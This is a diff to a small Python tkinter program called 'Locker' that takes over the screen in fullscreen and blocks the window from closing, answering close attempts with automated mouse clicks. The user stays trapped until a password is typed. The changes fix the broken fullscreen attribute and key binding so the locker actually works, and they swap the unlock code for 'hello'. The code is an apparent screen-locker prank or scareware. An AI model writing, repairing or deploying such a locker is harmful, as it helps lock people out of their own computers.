@@ -4,17 +4,17 @@ from time import sleep
 
 def callback(event):
     global k, entry
-    if entry.get() == 'yf[hty': k = True
+    if entry.get() == 'hello': k = True
 def on_closing():
     click(675, 420)
     moveTo(675, 420)
-    root.attributes("-fullscreeen", True)
+    root.attributes("-fullscreen", True)
     root.protocol("WM_DELETE_WINDOW", on_closing)
     root.update()
-    root.bind('<Control -KeyPress-C'. callback)
+    root.bind('<Control-KeyPress-c>', callback)
 root = Tk()
 root.title("Locker")
-root.attributes("-fullscreeen", True)
+root.attributes("-fullscreen", True)
 entry = Entry(root, font = 1)
 entry.place(width=150, height=50, x=600, y=400)
 label0 = Label(root, text="Locker_by_#001", font=1)
